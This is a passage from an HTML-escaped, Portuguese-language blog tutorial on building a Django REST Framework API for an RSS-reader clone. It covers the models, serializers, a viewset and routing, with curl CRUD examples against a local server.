um "Feedly-clone". O &lt;a href="https://feedly.com/" title="Visite o Feedly"&gt;&lt;em&gt;Feedly&lt;/em&gt;&lt;/a&gt; é uma espécie de leitor &lt;a href="https://klauslaube.com.br/2010/11/12/o-que-e-rss.html" title="O que é RSS?"&gt;&lt;em&gt;RSS&lt;/em&gt;&lt;/a&gt;
(com esteroides) muito popular.&lt;/p&gt;
&lt;p&gt;Vamos focar em dois tipos específicos: &lt;code&gt;Channel&lt;/code&gt; e &lt;code&gt;Item&lt;/code&gt;; &lt;em&gt;Channel&lt;/em&gt; é de fato o &lt;em&gt;website&lt;/em&gt; ou &lt;em&gt;blog&lt;/em&gt; que queremos registrar em
nossa plataforma. Esse é o mesmo nome utilizado pelo formato &lt;em&gt;RSS&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot; ?&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;rss&lt;/span&gt; &lt;span class="na"&gt;version=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;2.0&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;channel&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;RSS Title&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;description&amp;gt;&lt;/span&gt;This is an example of an RSS feed&lt;span class="nt"&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;link&amp;gt;&lt;/span&gt;http://www.example.com/main.html&lt;span class="nt"&gt;&amp;lt;/link&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;lastBuildDate&amp;gt;&lt;/span&gt;Mon, 06 Sep 2010 00:01:00 +0000 &lt;span class="nt"&gt;&amp;lt;/lastBuildDate&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;pubDate&amp;gt;&lt;/span&gt;Sun, 06 Sep 2009 16:20:00 +0000&lt;span class="nt"&gt;&amp;lt;/pubDate&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;ttl&amp;gt;&lt;/span&gt;1800&lt;span class="nt"&gt;&amp;lt;/ttl&amp;gt;&lt;/span&gt;

 &lt;span class="nt"&gt;&amp;lt;item&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Example entry&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;description&amp;gt;&lt;/span&gt;Here is some text containing an interesting description.&lt;span class="nt"&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;link&amp;gt;&lt;/span&gt;http://www.example.com/blog/post/1&lt;span class="nt"&gt;&amp;lt;/link&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;guid&lt;/span&gt; &lt;span class="na"&gt;isPermaLink=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;false&amp;quot;&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;7bd204c6-1655-4c27-aeee-53f933c5395f&lt;span class="nt"&gt;&amp;lt;/guid&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;pubDate&amp;gt;&lt;/span&gt;Sun, 06 Sep 2009 16:20:00 +0000&lt;span class="nt"&gt;&amp;lt;/pubDate&amp;gt;&lt;/span&gt;
 &lt;span class="nt"&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/channel&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/rss&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Já item, como ilustrado no exemplo acima, é de fato a notícia/artigo/música/podcast que aquele canal está publicando.&lt;/p&gt;
&lt;p&gt;Então, partiremos do princípio que os seguintes modelos já estão estabelecidos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# channels/models.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.db&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Channel&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TextField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URLField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__str__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;channel&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ForeignKey&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Channel&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;on_delete&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CASCADE&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TextField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;link&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URLField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;pub_date&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DateTimeField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="fm"&gt;__str__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O próximo passo será definir a &lt;em&gt;API&lt;/em&gt; para que um possível cliente &lt;em&gt;mobile&lt;/em&gt; (por exemplo) a consuma.&lt;/p&gt;
&lt;h2&gt;Os serializadores&lt;/h2&gt;
&lt;p&gt;Segundo a &lt;a href="https://www.django-rest-framework.org/api-guide/serializers/" title="Serializers"&gt;documentação oficial&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Serializers allow complex data such as querysets and model instances to be converted to native Python datatypes that can then be easily rendered into JSON, XML or other content types. Serializers also provide deserialization, allowing parsed data to be converted back into complex types, after first validating the incoming data.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Eles funcionam como um espécie de &lt;code&gt;Form&lt;/code&gt;, proporcionando ferramental para o &lt;em&gt;parsing&lt;/em&gt; e validação das requisições, bem como controlando o que será mandado como &lt;em&gt;output&lt;/em&gt; para o usuário. Dentro dessa analogia, o &lt;code&gt;ModelSerializer&lt;/code&gt; faz mais ou menos o que o &lt;code&gt;ModelForm&lt;/code&gt; faz. Logo, um bom candidato para começarmos a escrever o &lt;em&gt;endpoint&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# channels/serializers.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;serializers&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;channels.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Channel&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ChannelSerializer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serializers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ModelSerializer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;model&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Channel&lt;/span&gt;
        &lt;span class="n"&gt;fields&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma vez que estamos expondo todos os campos do modelo, é possível trocar a lista em &lt;code&gt;fields&lt;/code&gt;, pela &lt;em&gt;string&lt;/em&gt; &lt;code&gt;__all__&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Viewsets&lt;/h2&gt;
&lt;p&gt;Continuando com as analogias, um &lt;em&gt;viewset&lt;/em&gt; seria mais ou menos o que são as &lt;em&gt;class-based views&lt;/em&gt; no &lt;em&gt;Django&lt;/em&gt;. Elas abstraem uma
porção de lógica repetitiva (como &lt;em&gt;CRUD&lt;/em&gt;) através de uma estrutura muito familiar aos que já possuem certa vivência com o &lt;em&gt;framework&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# channels/api.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;viewsets&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;channels.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Channel&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;channels.serializers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChannelSerializer&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ChannelViewSet&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;viewsets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ModelViewSet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;queryset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Channel&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;serializer_class&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ChannelSerializer&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note que em &lt;code&gt;queryset&lt;/code&gt; apontamos para o modelo &lt;code&gt;Channel&lt;/code&gt;, e em &lt;code&gt;serializer_class&lt;/code&gt; para a classe serializadora criada anteriormente.&lt;/p&gt;
&lt;h2&gt;Fazendo o roteamento&lt;/h2&gt;
&lt;p&gt;Como último passo para termos algo de fato visual, vamos mapear as rotas para o novo recurso criado.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/hyperdrive.jpg" width="740" height="312" title="Usar DRF é como entrar em hyperdrive (pinpointe.com)" alt="Usar DRF é como entrar em hyperdrive (pinpointe.com)"&gt;&lt;/p&gt;
&lt;p&gt;Uma das vantagens de utilizar um &lt;em&gt;viewset&lt;/em&gt; é que ele também se encarrega de fazer o mapeamento das &lt;em&gt;URLs&lt;/em&gt;. Por exemplo, o &lt;code&gt;ChannelViewSet&lt;/code&gt; uma vez que mapeado,
responderá para rotas terminando em &lt;code&gt;/&lt;/code&gt; e &lt;code&gt;/&amp;lt;id-do-channel&amp;gt;&lt;/code&gt;. Além disso compreenderá que um &lt;code&gt;POST&lt;/code&gt; em &lt;code&gt;/&lt;/code&gt; é relacionado à criação de um novo elemento, bem como &lt;code&gt;DELETE&lt;/code&gt; em &lt;code&gt;/&amp;lt;id-do-channel&amp;gt;&lt;/code&gt; está relação à remoção:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# urls.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.urls&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;path&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;rest_framework&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;routers&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;channels.api&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ChannelViewSet&lt;/span&gt;

&lt;span class="n"&gt;api_router&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;routers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;DefaultRouter&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;api_router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;register&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;channels&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ChannelViewSet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;api/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;api_router&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urls&lt;/span&gt;&lt;span class="p"&gt;)),&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nesse momento já é possível presenciar um resultado mais sólido ao acessar &lt;code&gt;http://localhost:8000/api&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/django-rest-framework-example.png" width="740" height="405" title="Exemplo ao acessar o endereço no browser" alt="Exemplo ao acessar o endereço no browser"&gt;&lt;/p&gt;
&lt;p&gt;Não ligue para a porta &lt;code&gt;:5000&lt;/code&gt; no exemplo acima...&lt;/p&gt;
&lt;p&gt;Se você não é fã do &lt;em&gt;browsable api&lt;/em&gt;, e não quer ter essa visão do &lt;code&gt;API Root&lt;/code&gt; (como da imagem acima), troque o &lt;code&gt;DefaultRouter&lt;/code&gt; por &lt;code&gt;SimpleRouter&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;CRUD em ação&lt;/h2&gt;
&lt;p&gt;Considerando tudo o que foi dito até então, podemos esperar que temos o recurso mapeado no endereço &lt;code&gt;http://localhost:8000/api/channels&lt;/code&gt;,
e que a partir desse, poderemos desempenhar a listagem, adição, edição e exclusão de dados desse recurso.&lt;/p&gt;
&lt;p&gt;Começamos então adicionando um elemento, ao enviar o método &lt;code&gt;POST&lt;/code&gt; para o endereço com final &lt;code&gt;channels/&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -XPOST http://localhost:8000/api/channels/ --data &lt;span class="s1"&gt;&amp;#39;{&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;id&amp;quot;: 1,&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;title&amp;quot;: &amp;quot;Klaus Laube&amp;quot;,&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;description&amp;quot;: &amp;quot;Python, Django e desenvolvimento Web&amp;quot;,&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;link&amp;quot;: &amp;quot;https://klauslaube.com.br&amp;quot;&lt;/span&gt;
&lt;span class="s1"&gt;}&amp;#39;&lt;/span&gt; --header &lt;span class="s2"&gt;&amp;quot;Content-Type: application/json&amp;quot;&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:1,&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Klaus Laube&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Python, Django e desenvolvimento Web&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://klauslaube.com.br&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como o serializador espelha as propriedades do modelo &lt;code&gt;Channel&lt;/code&gt;, caso um campo obrigatório não seja enviado
no &lt;em&gt;payload&lt;/em&gt;, o próprio serializador se encarregará de fazer essa validação e de retornar detalhes do erro ao usuário:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -i -XPOST http://localhost:8000/api/channels/ --data &amp;#39;{
    &amp;quot;title&amp;quot;: &amp;quot;Klaus Laube&amp;quot;,
    &amp;quot;description&amp;quot;: &amp;quot;Python, Django, APIs, e desenvolvimento Web&amp;quot;
}&amp;#39; --header &amp;quot;Content-Type: application/json&amp;quot;

HTTP/1.1 400 Bad Request
Date: Tue, 11 Feb 2020 18:00:44 GMT
Server: WSGIServer/0.2 CPython/3.7.2
Content-Type: application/json
Vary: Accept, Cookie
Allow: GET, POST, HEAD, OPTIONS
X-Frame-Options: DENY
Content-Length: 36
X-Content-Type-Options: nosniff

{&amp;quot;link&amp;quot;:[&amp;quot;This field is required.&amp;quot;]}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como estamos falando de uma &lt;em&gt;API&lt;/em&gt; &lt;em&gt;REST&lt;/em&gt;, é normal esperarmos que um &lt;code&gt;GET&lt;/code&gt; no mesmo endereço traga uma lista de &lt;em&gt;channels&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl http://localhost:8000/api/channels/

&lt;span class="o"&gt;[{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:1,&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Klaus Laube&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Python, Django e desenvolvimento Web&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://klauslaube.com.br&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E normalmente, um &lt;code&gt;GET&lt;/code&gt; em &lt;code&gt;channels/1&lt;/code&gt; deve trazer detalhes daquele recurso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl http://localhost:8000/api/channels/1/

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:1,&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Klaus Laube&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Python, Django e desenvolvimento Web&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://klauslaube.com.br&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para atualizar o registro, enviamos o método &lt;code&gt;PUT&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -XPUT http://localhost:8000/api/channels/1/ --data &lt;span class="s1"&gt;&amp;#39;{&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;title&amp;quot;: &amp;quot;Klaus Laube&amp;quot;,&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;description&amp;quot;: &amp;quot;Python, Django, APIs, e desenvolvimento Web&amp;quot;,&lt;/span&gt;
&lt;span class="s1"&gt;    &amp;quot;link&amp;quot;: &amp;quot;https://klauslaube.com.br&amp;quot;&lt;/span&gt;
&lt;span class="s1"&gt;}&amp;#39;&lt;/span&gt; --header &lt;span class="s2"&gt;&amp;quot;Content-Type: application/json&amp;quot;&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;:1,&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Klaus Laube&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;Python, Django, APIs, e desenvolvimento Web&amp;quot;&lt;/span&gt;,&lt;span class="s2"&gt;&amp;quot;link&amp;quot;&lt;/span&gt;:&lt;span class="s2"&gt;&amp;quot;https://klauslaube.com.br&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E para finalizar, com &lt;code&gt;DELETE&lt;/code&gt; é possível remover o recurso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -XDELETE http://localhost:8000/api/channels/2/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mágico, não?!&lt;/p&gt;
&lt;h2&gt;Serializando relacionamentos&lt;/h2&gt;
&lt;p&gt;Passaremos a abordar agora a construção do &lt;em&gt;endpoint&lt;/em&gt; para o recurso &lt;code&gt;Item&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/vim-jedi.jpg" width="640" height="360" title="Nem o DRF consegue serializar o relacionamento entre Rey e Kylo (jovemnerd.com.br)" alt="Nem o DRF consegue serializar o relacionamento entre Rey e Kylo (jovemnerd.com.br)"&gt;&lt;/p&gt;
&lt;p&gt;Começamos pelo &lt;em&gt;serializer&lt;/em&gt;, que não é muito diferente do construído anteriormente para o modelo &lt;code&gt;Channel&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# channels/serializers.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;ItemSerializer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;serializers&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ModelSerializer&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;model&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Item&lt;/span&gt;
        &lt;span class="n"&gt;fields&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;__all__&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


